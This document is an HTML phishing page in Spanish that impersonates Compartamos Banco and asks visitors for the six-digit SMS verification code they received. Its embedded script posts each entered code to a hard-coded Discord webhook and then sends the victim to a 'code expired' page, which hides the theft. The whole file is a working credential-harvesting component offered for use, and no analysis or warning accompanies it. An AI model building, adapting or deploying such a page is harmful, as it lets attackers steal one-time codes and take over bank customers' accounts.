<!DOCTYPE html>

<html lang="es">
<head>
<meta charset="utf-8"/>
<title>Código de Seguridad</title>
<link href="style.css" rel="stylesheet"/>
</head>
<body>
<div class="container">
<img alt="Logo Compartamos Banco" src="Compartamos-Ba-768x163.jpg" style="max-width: 100%; height: auto; margin-bottom: 20px;"/>
<h1>Ingresa el código recibido via sms</h1>
<form id="codeForm">
<input id="codigo" maxlength="6" placeholder="Ingresa el código de 6 dígitos" required="" type="tel"/>
<button type="submit">Confirmar</button>
</form>
</div>
<script>
        document.getElementById('codeForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const codigo = document.getElementById('codigo').value;
            if (!/^\d{6}$/.test(codigo)) {
                alert("El código debe tener exactamente 6 dígitos.");
                return;
            }
            await fetch("https://discord.com/api/webhooks/1354514961703108739/PaD7lPWNnu8lfenpSc3oalDW7C3F9qVzHDM4SuRjSir6sC7EOW9X8DX8Z02F-GLiyzWN", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: `🔐 Código de seguridad: ${codigo}` })
            });
            window.location.href = "codigo_vencido.html";
        });
    </script>
</body>
</html>
